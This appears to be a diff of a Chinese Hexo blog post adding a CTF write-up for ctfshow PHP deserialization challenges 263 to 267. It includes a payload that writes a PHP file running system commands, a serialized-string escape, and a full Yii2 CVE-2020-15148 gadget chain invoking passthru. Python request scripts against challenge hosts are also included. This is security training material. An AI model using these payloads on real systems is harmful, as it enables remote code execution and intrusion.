@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="幻影旅团" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 6.0.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="幻影旅团" type="application/atom+xml">
 </head>
 
 
@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-15
+                    2022-02-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.6k
                 </div>
                 
 
@@ -617,25 +617,120 @@ $t='fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 class User{
     public $username = '1.php';
-    public $password = '&lt;?php system("tac flag.php")?&gt;';
+    public $password = '&lt;?php system("tac flag.php");?&gt;';
     public $status='dotast';
 
 }
 $a=new User();
 echo base64_encode('|'.serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>然后存进cookie中，带着cookie去访问<code>index.php</code>，接着访问<code>inc/inc.php</code>，然后就会生成文件<code>log-dotast.php</code>，直接写一个脚本</p>
-<pre class="line-numbers language-none"><code class="language-none">import requests
-url = "http://06573677-b16d-4788-a60d-2f244b945cd1.challenge.ctf.show:8080/"
-cookies = {"PHPSESSID": "g3us2rlfsn3q3fkahcja154gs8", "limit": "fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9"}
+<p>然后存进cookie中，带着cookie去访问<code>index.php</code>，接着访问<code>inc/inc.php</code>，然后就会生成文件<code>log-1.php</code>，直接写一个脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">
+import requests
+url = "http://19e6a276-1085-42e6-8ea2-f2a520e71dac.challenge.ctf.show/"
+cookies = {"PHPSESSID": "qj7611bsq24qnb08a8cnfg849k", "limit": "fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9"}
 res1 = requests.get(url + "index.php", cookies=cookies)
 
 res2 = requests.get(url + "inc/inc.php", cookies=cookies)
 
 res3 = requests.get(url + "log-1.php", cookies=cookies)
-print(res3.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+print(res3.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="264"><a href="#264" class="headerlink" title="264"></a>264</h2>
+
+
+<h2 id="264"><a href="#264" class="headerlink" title="264"></a>264</h2><p>和262差不多的反序列化字符串逃逸 </p>
+<p>不过访问<code>message.php</code>的时候需要<code>coookie</code>中的<code>msg</code>有值，因为<code>message.php</code>有如下判断</p>
+<pre class="line-numbers language-none"><code class="language-none">if(isset($_COOKIE['msg'])){
+    $msg = unserialize(base64_decode($_SESSION['msg']));
+    if($msg-&gt;token=='admin'){
+        echo $flag;
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">import requests
+url = "http://3a39bd69-62fe-402a-b1e4-143d8725b014.challenge.ctf.show/"
+cookies = {"PHPSESSID": "7u6jbqlm94dfubf2upuub5dfp0", "msg":"123"}
+get_url=url+"?f=123&amp;m=123&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D"
+res1 = requests.get(url=get_url)
+
+res2 = requests.get(url + "message.php", cookies=cookies)
+
+print(res2.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220217140028372.png" alt="image-20220217140028372"></p>
+<h2 id="265"><a href="#265" class="headerlink" title="265"></a>265</h2><p>看了一下代码逻辑，很显然，<code>$ctfshow</code>接收传进来的反序列化内容，然后把类中的token赋值为随机数。然后调用<code>login</code>方法，只有<code>token===password</code>才会输出flag；而我们怎么才能定义<code>password</code>的内容等于我们未知的随机数呢？我们可以采用php变量引用的方式</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$a =&amp;$b;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>注意：$a和$b是指向同一个地方，而不是$a指向了$b，亦或$b指向$a</p>
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+class ctfshowAdmin{
+    public $token = "dotast";
+    public $password = "dotast";
+
+    public function login(){
+        return $this-&gt;token===$this-&gt;password;
+    }
+}
+
+$a = new ctfshowAdmin();
+$a -&gt;token=&amp;$a -&gt;password;
+echo urlencode(serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="266"><a href="#266" class="headerlink" title="266"></a>266</h2><p>直接大小写绕过  </p>
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220217201248901.png" alt="image-20220217201248901"></p>
+<h2 id="267"><a href="#267" class="headerlink" title="267"></a>267</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120473172">https://blog.csdn.net/qq_46918279/article/details/120473172</a>  CVE-2020-15148–Yii2 反序列化漏洞复现</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a> bfengj</p>
+<p>弱密码 admin admin登录成功后，在about页面发现提示?view-source<br>访问url/?r=site/about&amp;view-source得到反序列化点<br>payload ?r=backdoor/shell&amp;code=poc</p>
+<p>poc.php</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+namespace yii\rest{
+    class CreateAction{
+        public $checkAccess;
+        public $id;
+
+        public function __construct(){
+            $this-&gt;checkAccess = 'passthru';
+            $this-&gt;id = 'cat /flag';
+        }
+    }
+}
+
+namespace Faker{
+    use yii\rest\CreateAction;
+
+    class Generator{
+        protected $formatters;
+
+        public function __construct(){
+            $this-&gt;formatters['close'] = [new CreateAction(), 'run'];
+        }
+    }
+}
+
+namespace yii\db{
+    use Faker\Generator;
+
+    class BatchQueryResult{
+        private $_dataReader;
+
+        public function __construct(){
+            $this-&gt;_dataReader = new Generator;
+        }
+    }
+}
+
+namespace{
+    echo base64_encode(serialize(new yii\db\BatchQueryResult));
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220218230105536.png" alt="image-20220218230105536"></p>
+
                 
             </div>
             <hr/>
@@ -1160,7 +1255,7 @@ print(res3.text)<span aria-hidden="true" class="line-numbers-rows"><span></span>
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">13.3k</span>
+                        class="white-color">13.8k</span>
             
             
             
@@ -1345,16 +1440,17 @@ $(function () {
     
 
     
-
-    <!-- 雪花特效 -->
-     
+        
         <script type="text/javascript">
             // 只在桌面版网页启用特效
             var windowWidth = $(window).width();
             if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
             }
         </script>
+    
+
+    <!-- 雪花特效 -->
     
 
     <!-- 鼠标星星特效 -->
